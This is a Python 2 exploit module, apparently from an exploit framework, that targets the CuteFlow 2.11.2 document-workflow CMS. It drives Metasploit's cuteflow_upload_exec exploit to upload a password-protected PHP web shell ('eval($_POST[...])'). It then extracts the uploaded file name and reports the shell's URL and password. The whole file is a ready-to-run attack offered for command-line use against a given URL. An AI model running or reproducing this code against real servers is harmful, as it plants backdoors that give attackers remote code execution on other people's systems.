#coding: utf-8
import urlparse
import os, re
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
import re, random
from commonlib.process import proc

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
exp打击无法实现
modify by swm 20180817

"""
class cuteflow_v2_11_2_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'cuteflow_v2_11_2_getshell',
            'author': 't',
            'date': '2018-04-24',
            'attack_type': 'GetShell',
            'app_type': 'CMS', 
            'app_name': 'cuteflow',
            'min_version': '',
            'max_version': '',
            'version_list': '2.11.2',
            'description': 'CuteFlow是一个基于Web的文档流转/工作流工具。用户定义好一个文档之后就会按指定的流程一步一步地转发给列表中的每一个用户。',
            'reference':'',
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        self.url = self.url.strip('/')
        target_uri = target_uri = '/'.join(self.url.split('/')[3:]) or '/'
        is_ssl = "true" if 'https' in self.url else 'false'
        password = get_random_password()
        url_parser = urlparse.urlparse(self.url)
        if ':' in url_parser.netloc:
            host, port = url_parser.netloc.split(':')
            host_port_setting = 'set rhost %s;' % host
            host_port_setting += 'set rport %s;' % port
        else:
            host_port_setting = 'set rhost %s;' % url_parser.netloc
        cmd = '''msfconsole -qx '
        use exploit/multi/http/cuteflow_upload_exec;
        set payload generic/custom;
        %s
        set targeturi "%s";
        set ssl "%s";
        set payloadstr "eval($_POST[%s])";
        run;exit -y;'
        ''' % (host_port_setting, target_uri, is_ssl, password)
        p = proc(cmd.replace('\n', ''))
        p.run()
        p.wait()
        x = p.getoutput()
        for line in x:
            print line
        retrieve_file = re.findall('Retrieving file: (\w+).php', str(x))
        shell_path = '%s/upload/___1/%s.php' % (self.url, retrieve_file[0])
        self.shell_info(shell_path, password, 'php')

       
if __name__ == "__main__":
    if len(sys.argv) == 2:
        a = cuteflow_v2_11_2_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__


